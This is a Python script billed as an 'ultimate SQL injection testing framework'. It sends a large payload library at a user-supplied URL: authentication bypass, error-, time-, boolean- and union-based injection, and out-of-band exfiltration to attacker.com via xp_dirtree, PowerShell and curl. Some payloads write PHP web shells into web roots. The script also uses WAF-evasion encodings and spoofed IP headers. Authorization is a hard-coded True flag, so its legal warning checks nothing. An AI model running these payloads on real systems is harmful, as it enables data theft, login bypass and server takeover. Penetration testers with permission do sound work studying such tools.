import argparse
import requests
import time
import random
import urllib.parse
import base64
import warnings
import sys
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

AUTHORIZED = True
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
DELAY = random.uniform(1.0, 3.0)
USE_PROXY = False
PROXIES = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} if USE_PROXY else {}
SESSION_COOKIE = None
VERBOSE = True
MAX_PAYLOADS_PER_CATEGORY = 10
TIMEOUT = 45
MAX_RETRIES = 3
CONNECT_TIMEOUT = 15

warnings.filterwarnings("ignore", category=InsecureRequestWarning)
warnings.filterwarnings("ignore", category=DeprecationWarning)

SQL_INJECTOR_ART = f"""{Colors.CYAN}
  _______ ______  __  __ _____ 
 |__   __|  ____||  \/  |_   _|
    | |  | |__   | \  / | | |  
    | |  |  __|  | |\/| | | |  
    | |  | |____ | |  | |_| |_ 
    |_|  |______||_|  |_|_____|

{Colors.GREEN}ULTIMATE SQL INJECTION TESTING FRAMEWORK{Colors.END}
{Colors.YELLOW}• Advanced Payloads • WAF Bypass • Multi-DB Support •{Colors.END}
"""

PAYLOAD_LIBRARY = {
    "auth_bypass": [
        "' OR '1'='1'--",
        "admin'--",
        "' OR 1=1#",
        "'=''='",
        "' OR 'a'='a'",
        "admin' OR 1=1/*",
        "\" OR \"\"=\""
    ],
    "error_based": [
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "'; SELECT 1/0 FROM sys.databases--",
        "' AND EXTRACTVALUE(0,CONCAT(0x5c,@@version))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND 1=CAST((SELECT version()) AS INT)--",
        "' AND 1=(SELECT 1 FROM GENERATE_SERIES(1,1000000))--",
        "' AND 1=(SELECT UTL_INADDR.GET_HOST_NAME((SELECT version FROM v$instance)) FROM DUAL)--",
        "' AND CTXSYS.DRITHSX.SN(1,(SELECT version FROM v$instance)) = 1--"
    ],
    "time_based": [
        "'; IF SYSTEM_USER='sa' WAITFOR DELAY '0:0:5'--",
        "' OR 1=1 WAITFOR DELAY '0:0:5'--",
        "' OR IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--",
        "' OR (SELECT * FROM (SELECT(SLEEP(5)))--",
        "'; SELECT CASE WHEN (SELECT current_setting('server_version')) ~ '^10' THEN pg_sleep(5) END--",
        "' OR (SELECT 1 FROM PG_SLEEP(5))--",
        "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--",
        "' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL) IS NOT NULL--"
    ],
    "boolean_based": [
        "' OR 1=(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>0) THEN 1 ELSE 0 END)--",
        "' OR (SELECT SUBSTRING(version(),1,1))='5' OR '1'='2'--",
        "' OR (SELECT IF(ASCII(SUBSTRING(version(),1,1))>0,1,0))--",
        "' OR (SELECT SUBSTRING(version(),1,1)='9')::int::boolean--",
        "' OR (SELECT ASCII(SUBSTR((SELECT banner FROM v$version WHERE rownum=1),1,1)) FROM DUAL) > 0 OR '1'='2'--"
    ],
    "union_based": [
        "' UNION SELECT NULL,version(),NULL--",
        "' UNION SELECT NULL,name,NULL FROM master..sysdatabases--",
        "' UNION SELECT NULL,SQL_VARIANT_PROPERTY(@@version,'ProductVersion'),NULL--",
        "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",
        "' UNION SELECT NULL,current_database(),NULL--",
        "' UNION SELECT NULL,string_agg(table_name, ','),NULL FROM information_schema.tables--",
        "' UNION SELECT NULL,banner,NULL FROM v$version--",
        "' UNION SELECT NULL,table_name,NULL FROM all_tables--"
    ],
    "oob_exfiltration": [
        "'; EXEC master..xp_dirtree '//attacker.com/share'--",
        "'; DECLARE @q VARCHAR(8000); SET @q = (SELECT @@version); EXEC ('xp_cmdshell ''powershell Invoke-WebRequest -Uri http://attacker.com/?data='+@q+''''')--",
        "' OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\test.txt')))--",
        "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?data=$(cat)'--",
        "' OR UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1)) IS NOT NULL--"
    ],
    "waf_bypass": [
        "'%20OR%201=1--",
        "'%09OR%091=1--",
        "1' AND@a:=(SELECT COALESCE(CAST(version() AS VARCHAR(100))) OR '1'='1",
        "'/*!50000OR*/1=1--",
        "'/**/OR/**/1=1--",
        "' OR 1=1 -- -",
        "' OR 1=1 LIMIT 1 --",
        "' OR 1=1 OFFSET 0 --",
        "'=0+1--",
        "'||1=1#",
        '{"username":"admin\' OR 1=1--"}',
        '<xml><username>admin\' OR 1=1--</username></xml>'
    ],
    "second_order": [
        "admin' OR 1=1--",
        "test'; UPDATE users SET password='hacked' WHERE username='admin';--",
        "test'; INSERT INTO audit_log (event) VALUES (CONCAT('Executed by: ', USER()));--"
    ],
    "file_operations": [
        "' OR 1=1 INTO OUTFILE '/var/www/shell.php' LINES TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e--",
        "'; COPY (SELECT '<?php system($_GET[\"c\"]); ?>') TO '/var/www/shell.php'--",
        r"'; EXEC xp_cmdshell 'echo <?php system($_GET[\"c\"]); ?> > C:\\inetpub\\wwwroot\\shell.php'--"
    ]
}

def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"],
        connect=MAX_RETRIES,
        read=MAX_RETRIES
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = False
    session.proxies = PROXIES
    return session

def print_status(message):
    print(f"{Colors.BLUE}[*]{Colors.END} {message}")

def print_success(message):
    print(f"{Colors.GREEN}[+]{Colors.END} {message}")

def print_warning(message):
    print(f"{Colors.YELLOW}[!]{Colors.END} {message}")

def print_error(message):
    print(f"{Colors.RED}[X]{Colors.END} {message}")

def print_critical(message):
    print(f"\n{Colors.RED}{Colors.BOLD}[!] CRITICAL ERROR:{Colors.END} {message}\n")

def print_vulnerable(message):
    print(f"{Colors.GREEN}{Colors.BOLD}[!] VULNERABILITY DETECTED:{Colors.END} {message}")

def check_connectivity(session, url):
    try:
        print_status("Checking target connectivity...")
        response = session.get(
            url,
            headers={"User-Agent": USER_AGENT},
            timeout=(CONNECT_TIMEOUT, TIMEOUT)
        )
        if response.status_code == 200:
            print_success("Target is reachable and responding")
            return True
        else:
            print_warning(f"Target responded with HTTP {response.status_code}")
            return True
    except requests.exceptions.SSLError:
        print_warning("SSL verification failed. Trying without certificate validation...")
        try:
            response = session.get(
                url,
                headers={"User-Agent": USER_AGENT},
                timeout=(CONNECT_TIMEOUT, TIMEOUT),
                verify=False
            )
            return True
        except Exception as e:
            print_error(f"SSL connection failed: {str(e)}")
            return False
    except Exception as e:
        print_error(f"Connectivity check failed: {str(e)}")
        return False

def gather_target_intelligence(session, url):
    """Collect information about the target for smarter payload generation"""
    domain = urlparse(url).netloc
    print_success(f"Gathering target intelligence for {domain}")
    tech_stack = {}
    
    try:

        try:
            response = session.get(
                url,
                headers={"User-Agent": USER_AGENT},
                timeout=(CONNECT_TIMEOUT, TIMEOUT)
            )
        except requests.exceptions.SSLError:
            print_warning("SSL verification failed. Trying without certificate validation...")
            response = session.get(
                url,
                headers={"User-Agent": USER_AGENT},
                timeout=(CONNECT_TIMEOUT, TIMEOUT),
                verify=False
            )
        
        if response.status_code != 200:
            print_warning(f"Received HTTP {response.status_code} for main page")
        
        server_header = response.headers.get('Server', '')
        x_powered_by = response.headers.get('X-Powered-By', '')
        content_type = response.headers.get('Content-Type', '')
        set_cookie = response.headers.get('Set-Cookie', '')
        
        if server_header:
            print(f"    {Colors.BOLD}Server:{Colors.END} {server_header}")
            tech_stack['server'] = server_header
        
        if x_powered_by:
            print(f"    {Colors.BOLD}X-Powered-By:{Colors.END} {x_powered_by}")
            tech_stack['framework'] = x_powered_by
            
        if content_type:
            print(f"    {Colors.BOLD}Content-Type:{Colors.END} {content_type}")
            tech_stack['content_type'] = content_type
            
        if set_cookie:
            print(f"    {Colors.BOLD}Set-Cookie:{Colors.END} {set_cookie[:50]}...")
            if 'ASP.NET' in set_cookie:
                tech_stack['tech'] = 'ASP.NET'
    

        tech_files = {
            '/web.config': 'ASP.NET',
            '/package.json': 'Node.js',
            '/composer.json': 'PHP',
            '/wp-config.php': 'WordPress',
            '/.env': 'Laravel',
            '/robots.txt': 'Generic'
        }
        
        for path, tech in tech_files.items():
            try:
                res = session.get(
                    url.rstrip('/') + path,
                    headers={"User-Agent": USER_AGENT},
                    timeout=10
                )
                if res.status_code == 200:
                    print(f"    {Colors.BOLD}Found:{Colors.END} {path} → {tech}")
                    tech_stack['tech'] = tech
                elif res.status_code == 403:
                    print(f"    {Colors.YELLOW}Access forbidden:{Colors.END} {path}")
            except Exception as e:
                print_warning(f"File check skipped for {path}: {str(e)}")
        

        try:
            waf_test = session.get(
                url + "/?id=1' OR 1=1--", 
                headers={"User-Agent": USER_AGENT},
                timeout=15
            )
            
            waf_indicators = [
                "cloudflare", "akamai", "incapsula", 
                "barracuda", "imperva", "403 forbidden",
                "access denied", "waf", "blocked",
                "mod_security", "big-ip"
            ]
            
            waf_detected = False
            for indicator in waf_indicators:
                if (indicator in waf_test.text.lower() or 
                    indicator in waf_test.headers.get('Server', '').lower() or
                    indicator in waf_test.headers.get('X-CDN', '').lower()):
                    waf_detected = True
                    break
                    
            if waf_detected:
                print(f"    {Colors.RED}[WAF DETECTED]{Colors.END} Security mechanism present")
                tech_stack['waf'] = True
            else:
                print(f"    {Colors.GREEN}[~]{Colors.END} No obvious WAF detected")
        except Exception as e:
            print_warning(f"WAF detection skipped: {str(e)}")
        

        if 'Microsoft-IIS' in server_header or 'ASP.NET' in x_powered_by:
            tech_stack['db'] = 'MSSQL'
            print(f"    {Colors.BOLD}Database:{Colors.END} MSSQL (inferred)")
        elif 'PHP' in x_powered_by:
            tech_stack['db'] = 'MySQL'
            print(f"    {Colors.BOLD}Database:{Colors.END} MySQL (inferred)")
        elif 'X-Powered-By' in response.headers and 'Express' in response.headers['X-Powered-By']:
            tech_stack['db'] = 'PostgreSQL'
            print(f"    {Colors.BOLD}Database:{Colors.END} PostgreSQL (inferred)")
        else:
            print(f"    {Colors.YELLOW}[!]{Colors.END} Database type unknown")
        
        return tech_stack
        
    except Exception as e:
        print_error(f"Intelligence gathering failed: {str(e)}")
        return {}

def generate_evaded_payloads(payload, tech_stack={}):
    variations = []
    
    transformations = [
        lambda p: p,
        lambda p: ''.join(random.choice([c.upper(), c.lower()]) for c in p),
        lambda p: urllib.parse.quote(p),
        lambda p: urllib.parse.quote(urllib.parse.quote(p)),
        lambda p: base64.b64encode(p.encode()).decode(),
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace("'", "%00'"),
        lambda p: p.replace("OR", "/*!50000OR*/"),
        lambda p: p.replace("SELECT", "SEL%0AECT"),
        lambda p: p.replace("=", " LIKE "),
        lambda p: p.replace("--", "#")
    ]
    
    for transform in transformations:
        try:
            variations.append(transform(payload))
        except Exception as e:
            print_warning(f"Payload transformation failed: {str(e)}")
            variations.append(payload)
    
    db = tech_stack.get('db', '')
    if db == 'MSSQL':
        variations.extend([
            "'; EXEC xp_cmdshell 'whoami'--",
            "' OR 1=1 WAITFOR DELAY '0:0:5'--",
            "' UNION SELECT NULL,SQL_VARIANT_PROPERTY(@@version,'ProductVersion'),NULL--"
        ])
    elif db == 'MySQL':
        variations.extend([
            "' OR SLEEP(5)--",
            "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",
            "' OR 1=1 INTO OUTFILE '/var/www/shell.php'--"
        ])
    elif db == 'PostgreSQL':
        variations.extend([
            "'; SELECT PG_SLEEP(5)--",
            "' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL--",
            "'; COPY (SELECT 'malicious') TO '/tmp/exploit'--"
        ])
    
    if tech_stack.get('waf'):
        variations.extend([
            "'||1=1#",
            "'=0+1#",
            "' OR 1=1 ORDER BY 1--",
            "'/**/OR/**/1=1--",
            "' OR 1=1 --%0A"
        ])
    
    variations = list(set(variations))
    return variations[:MAX_PAYLOADS_PER_CATEGORY]

def generate_evaded_headers():
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://google.com/",
        "X-Originating-IP": "127.0.0.1"
    }
    
    headers["X-Client-IP"] = f"127.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    return headers

def send_evaded_request(session, url, payload, param_name="username"):
    headers = generate_evaded_headers()
    
    params = {param_name: payload}
    
    if 'Microsoft-IIS' in headers.get('Server', ''):
        params["__VIEWSTATE"] = "/wEPDwUKMTY1NDU2MDAwNGRk"
    elif 'PHP' in headers.get('X-Powered-By', ''):
        params["PHPSESSID"] = "injected"
    
    content_type = random.choice([
        "application/x-www-form-urlencoded",
        "application/json",
        "multipart/form-data"
    ])
    headers["Content-Type"] = content_type
    
    try:
        if content_type == "application/json":
            response = session.post(
                url,
                json=params,
                headers=headers,
                cookies={"session": SESSION_COOKIE} if SESSION_COOKIE else None,
                timeout=(CONNECT_TIMEOUT, TIMEOUT),
                allow_redirects=True
            )
        else:
            response = session.post(
                url,
                data=params,
                headers=headers,
                cookies={"session": SESSION_COOKIE} if SESSION_COOKIE else None,
                timeout=(CONNECT_TIMEOUT, TIMEOUT),
                allow_redirects=True
            )
        
        return response
    
    except requests.exceptions.RequestException as e:
        print_error(f"Request failed: {str(e)}")
        return None
    except Exception as e:
        print_critical(f"Unexpected request error: {str(e)}")
        return None

def analyze_response(response, payload, start_time):
    if not response:
        return False, {}
    
    try:
        total_time = time.time() - start_time
        analysis = {
            "status": response.status_code,
            "time": response.elapsed.total_seconds(),
            "total_time": total_time,
            "length": len(response.content),
            "redirect": response.history != [],
            "db_errors": any(e in response.text for e in [
                "SQL", "syntax error", "ORA-", "MySQL", "PostgreSQL", 
                "ODBC", "JDBC", "Driver", "SQLite", "MariaDB",
                "unclosed quotation", "SQLSTATE", "syntax near",
                "Database Error", "Query failed", "SQL command"
            ]),
            "time_delay": total_time > 5.0,
            "content_diff": "login" not in response.text.lower() or "welcome" in response.text.lower()
        }
        
        server_header = response.headers.get('Server', '')
        x_powered_by = response.headers.get('X-Powered-By', '')
        
        if "Microsoft-IIS" in server_header:
            analysis["framework_error"] = "Server Error" in response.text or "Runtime Error" in response.text
        elif "PHP" in x_powered_by:
            analysis["framework_error"] = "Fatal error" in response.text or "PHP Error" in response.text
        elif "Apache" in server_header:
            analysis["framework_error"] = "Internal Server Error" in response.text
        
        analysis["bypass_success"] = (
            "welcome" in response.text.lower() or 
            "logout" in response.text.lower() or
            "dashboard" in response.text.lower() or
            "success" in response.text.lower() or
            response.status_code == 302
        )
        
        vulnerable = any([
            analysis["status"] in [500, 403, 401],
            analysis["db_errors"],
            analysis["time_delay"],
            analysis.get("framework_error", False),
            analysis["bypass_success"],
            analysis["status"] == 200 and analysis["content_diff"]
        ])
        
        return vulnerable, analysis
    
    except Exception as e:
        print_critical(f"Analysis error: {str(e)}")
        return False, {}

def print_payload_info(category, count, payload, evaded):
    print(f"\n{Colors.YELLOW}[+] Payload #{count}: {category}/{count}{Colors.END}")
    print(f"    {Colors.BOLD}Original:{Colors.END} {payload}")
    print(f"    {Colors.BOLD}Evaded:{Colors.END} {evaded[:120]}{'...' if len(evaded) > 120 else ''}")

def print_vulnerability_info(analysis):
    print_vulnerable("Potential vulnerability detected!")
    print(f"    {Colors.BOLD}Status:{Colors.END} {analysis['status']}")
    print(f"    {Colors.BOLD}Response time:{Colors.END} {analysis['time']:.2f}s")
    print(f"    {Colors.BOLD}Total time:{Colors.END} {analysis['total_time']:.2f}s")
    
    if analysis["status"] == 500:
        print(f"    {Colors.RED}SERVER ERROR (500){Colors.END}")
    if analysis["status"] == 403:
        print(f"    {Colors.RED}FORBIDDEN (403){Colors.END}")
    if analysis["status"] == 401:
        print(f"    {Colors.RED}UNAUTHORIZED (401){Colors.END}")
    if analysis["redirect"]:
        print(f"    {Colors.YELLOW}REDIRECT DETECTED{Colors.END}")
    if analysis["db_errors"]:
        print(f"    {Colors.RED}DATABASE ERROR DETECTED{Colors.END}")
    if analysis["time_delay"]:
        print(f"    {Colors.RED}TIME DELAY DETECTED ({analysis['total_time']:.2f}s){Colors.END}")
    if analysis.get("framework_error", False):
        print(f"    {Colors.RED}FRAMEWORK ERROR DETECTED{Colors.END}")
    if analysis["bypass_success"]:
        print(f"    {Colors.GREEN}AUTHENTICATION BYPASS INDICATED{Colors.END}")

def print_response_details(response):
    if not response:
        print(f"    {Colors.RED}NO RESPONSE RECEIVED{Colors.END}")
        return
    
    print(f"    {Colors.BOLD}Response Status:{Colors.END} {response.status_code}")
    print(f"    {Colors.BOLD}Response Size:{Colors.END} {len(response.content)} bytes")
    
    interesting_headers = ['Server', 'X-Powered-By', 'Set-Cookie', 'Content-Type', 'Content-Length']
    print(f"    {Colors.BOLD}Headers:{Colors.END}")
    for header in interesting_headers:
        if header in response.headers:
            print(f"      {header}: {response.headers[header]}")
    
    if response.text:
        snippet = response.text[:200].replace('\n', ' ')
        print(f"    {Colors.BOLD}Response Snippet:{Colors.END} {snippet}...")
    else:
        print(f"    {Colors.YELLOW}No response text available{Colors.END}")

def test_ultimate_sqli(target_url):
    if not AUTHORIZED:
        print_error("Testing without authorization is illegal")
        return
    
    domain = urlparse(target_url).netloc
    print_status(f"Starting Ultimate SQL Injection Test on {domain}")
    
    session = create_session()
    
    if not check_connectivity(session, target_url):
        print_critical("Target is not reachable. Aborting test.")
        return
    
    tech_stack = gather_target_intelligence(session, target_url)
    
    print_status(f"Payload Categories: {len(PAYLOAD_LIBRARY)}")
    print_status(f"Random Delay: {DELAY:.2f}s")
    print_status(f"Using Proxy: {'Yes' if USE_PROXY and PROXIES else 'No'}")
    print_status(f"Max Payloads per Category: {MAX_PAYLOADS_PER_CATEGORY}\n")
    
    vulnerable_count = 0
    tested_payloads = 0
    
    for category, payloads in PAYLOAD_LIBRARY.items():
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== TESTING {category.upper()} PAYLOADS ==={Colors.END}")
        
        for payload in payloads:
            try:
                evaded_payloads = generate_evaded_payloads(payload, tech_stack)
            except Exception as e:
                print_error(f"Payload generation failed: {str(e)}")
                continue
            
            for i, evaded_payload in enumerate(evaded_payloads):
                tested_payloads += 1
                start_time = time.time()
                
                print_payload_info(category, tested_payloads, payload, evaded_payload)
                
                response = send_evaded_request(session, target_url, evaded_payload)
                
                try:
                    vulnerable, analysis = analyze_response(response, evaded_payload, start_time)
                except Exception as e:
                    print_error(f"Analysis failed: {str(e)}")
                    vulnerable = False
                    analysis = {}
                
                if vulnerable:
                    vulnerable_count += 1
                    print_vulnerability_info(analysis)
                else:
                    if VERBOSE:
                        print(f"{Colors.YELLOW}[~] No vulnerability indicators detected{Colors.END}")
                
                print_response_details(response)
                
                sleep_time = DELAY + random.uniform(-0.3, 0.7)
                time.sleep(max(1.0, sleep_time))
    
    print(f"\n\n{Colors.CYAN}{Colors.BOLD}=== TESTING COMPLETE ==={Colors.END}")
    print(f"    {Colors.BOLD}Total Payloads Tested:{Colors.END} {tested_payloads}")
    print(f"    {Colors.BOLD}Potential Vulnerabilities Found:{Colors.END} {vulnerable_count}")
    
    if vulnerable_count > 0:
        print(f"\n{Colors.GREEN}{Colors.BOLD}NEXT STEPS:{Colors.END}")
        print(f"1. Verify vulnerabilities manually")
        print(f"2. Use SQLMap for confirmation: sqlmap -u '{target_url}' --risk=3 --level=5")
        print(f"3. Check Burp Suite history for detailed analysis")
        print(f"4. Document findings in penetration test report")
        print(f"5. Consider exploitation for proof-of-concept")
    else:
        print(f"\n{Colors.YELLOW}{Colors.BOLD}RECOMMENDATIONS:{Colors.END}")
        print(f"1. Test different parameters (search, filter, order)")
        print(f"2. Try different injection points (headers, cookies)")
        print(f"3. Use manual testing with Burp Suite")
        print(f"4. Consider blind SQLi techniques")
    
    print(f"\n{Colors.RED}{Colors.BOLD}LEGAL REMINDER:{Colors.END} Always have explicit authorization before testing")

def handle_exception(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        print(f"\n{Colors.YELLOW}[!] Testing interrupted by user{Colors.END}")
        sys.exit(0)
    else:
        print_critical(f"Unhandled exception: {str(exc_value)}")
        sys.__excepthook__(exc_type, exc_value, exc_traceback)

sys.excepthook = handle_exception

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Ultimate SQL Injection Testing Framework')
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    args = parser.parse_args()
    
    print(SQL_INJECTOR_ART)
    print(f"{Colors.YELLOW}{Colors.BOLD}LEGAL WARNING:{Colors.END}")
    print("This tool must only be used on systems with EXPLICIT WRITTEN AUTHORIZATION")
    print("Unauthorized access violates computer crime laws in most jurisdictions")
    print("By proceeding you confirm you have proper authorization for the target\n")
    
    if AUTHORIZED:
        try:
            test_ultimate_sqli(args.url)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Testing interrupted by user{Colors.END}")
        except Exception as e:
            print_critical(f"Unexpected error: {str(e)}")
    else:
        print_error("ABORTED: AUTHORIZED=False - Testing not permitted")